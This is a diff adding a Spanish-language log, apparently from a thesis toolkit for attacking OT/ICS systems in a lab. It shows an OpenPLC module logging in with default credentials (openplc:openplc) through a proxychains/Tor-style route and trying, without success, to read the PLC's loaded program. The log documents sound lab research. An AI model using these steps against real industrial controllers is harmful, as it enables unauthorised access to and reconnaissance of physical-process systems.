@@ -1,0 +1,25 @@
+======================================================================
+  TFM - TOOLKIT DE ATAQUES OT/ICS (laboratorio local aislado)
+  OpenPLC - Lectura del programa activo
+======================================================================
+  Fecha      : 2026-10-12 12:33:04
+  Objetivo   : 192.168.10.10:8080 (openplc:openplc)
+  MITRE ICS  : T0888, T0845
+======================================================================
+$ proxychains python3 -m modules._cli.openplc_cli get_current_program --target 192.168.10.10 --port 8080 --user openplc --password openplc
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[*] POST http://192.168.10.10:8080/login  (usuario=openplc)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 302
+[+] Sesión establecida.
+[*] GET http://192.168.10.10:8080/programs
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 200
+[*] GET http://192.168.10.10:8080/settings  (para localizar Loaded_Program)
+[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.168.10.10:8080  ...  OK
+    -> HTTP 200
+    -> Loaded_Program = None
+[-] No pude extraer la tabla /programs.
+[=] Código de salida: 0
